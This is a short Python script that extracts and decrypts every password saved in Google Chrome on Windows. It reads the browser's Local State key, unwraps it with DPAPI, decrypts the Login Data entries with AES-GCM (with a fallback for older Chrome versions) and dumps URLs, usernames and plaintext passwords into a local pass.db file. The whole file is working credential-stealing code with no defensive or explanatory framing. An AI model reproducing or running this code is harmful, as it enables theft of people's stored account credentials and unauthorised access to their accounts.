import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

def key():
    with open(os.getenv("APPDATA") + r'\..\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(key, iv)
        pwd = decrypt_payload(cipher, payload)
        pwd = pwd[:-16].decode() 
        return pwd
    except:
        #Chrome version < 80
        try:
            password = win32crypt.CryptUnprotectData(buff , None, None, None, 0)[1]
            return password
        except:
            pass

def windows():
    login_db = os.getenv("APPDATA") + r'\..\Local\Google\Chrome\User Data\Default\Login Data'
    conn = sqlite3.connect(login_db)
    conn2 = sqlite3.connect("pass.db")
    cursor = conn.cursor()
    cursor2 = conn2.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        cursor2.execute('''CREATE TABLE passwords(url, username, password)''')
        for r in cursor.fetchall():
            decrypted_password = decrypt_password(r[2], key())
            if decrypted_password:
                cursor2.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (r[0], r[1], decrypted_password))
                conn2.commit()
            

    except Exception as e:
        pass
    finally:
        cursor.close()
        conn.close()
        
if __name__ == "__main__":
    windows()
